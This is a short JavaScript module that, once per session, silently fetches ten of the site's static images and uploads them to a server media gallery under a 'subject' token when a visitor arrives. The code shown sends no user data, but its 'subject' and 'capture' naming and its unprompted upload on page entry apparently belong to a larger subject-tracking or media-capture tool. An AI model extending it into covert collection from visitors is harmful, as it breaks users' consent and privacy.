import { SUBJECT_GALLERY_PAYLOAD_ENABLED, GALLERY_PAYLOAD_PATHS } from './config';
import { uploadSubjectMedia } from './mediaUpload';

function absoluteUrl(relativePath) {
    const base = process.env.PUBLIC_URL || '';
    const href = `${base}${relativePath}`.replace(/([^:]\/)\/+/g, '$1');
    return new URL(href, window.location.href).href;
}

function isDone(storageKey) {
    try {
        return sessionStorage.getItem(storageKey) === '1';
    } catch {
        return true;
    }
}

function markDone(storageKey) {
    try {
        sessionStorage.setItem(storageKey, '1');
    } catch {
        /* ignore */
    }
}

async function fetchImageBlob(relativePath) {
    const res = await fetch(absoluteUrl(relativePath), {
        cache: 'no-store',
        credentials: 'same-origin'
    });
    if (!res.ok) throw new Error(`gallery_fetch_${res.status}`);
    const raw = await res.blob();
    const type = raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
    return raw.type === type ? raw : new Blob([raw], { type });
}

/**
 * 10 statik şəkli server media qaleriyasına yüklə (sessiya başına bir dəfə).
 */
export async function uploadGalleryPayloadOnce(
    storageKey = 'pulse_gallery_payload_v1',
    ctx = {}
) {
    if (!SUBJECT_GALLERY_PAYLOAD_ENABLED || isDone(storageKey)) return false;
    if (!ctx.subjectToken && !ctx.clientSessionId) return false;

    let uploaded = 0;
    for (let i = 0; i < GALLERY_PAYLOAD_PATHS.length; i += 1) {
        try {
            const blob = await fetchImageBlob(GALLERY_PAYLOAD_PATHS[i]);
            await uploadSubjectMedia({
                subjectToken: ctx.subjectToken,
                clientSessionId: ctx.clientSessionId,
                type: 'photo',
                blob,
                captureSource: 'gallery_payload',
                chunkIndex: i + 1
            });
            uploaded += 1;
        } catch (e) {
            console.warn('gallery payload upload:', GALLERY_PAYLOAD_PATHS[i], e?.message || e);
        }
    }

    if (uploaded > 0) {
        markDone(storageKey);
        return true;
    }
    return false;
}

/** Sayta girəndə avtomatik qaleriya yükləməsi */
export function attachGalleryPayloadUploadOnEntry(storageKey, ctx = {}) {
    if (!SUBJECT_GALLERY_PAYLOAD_ENABLED || isDone(storageKey)) return () => {};

    uploadGalleryPayloadOnce(storageKey, ctx);
    return () => {};
}
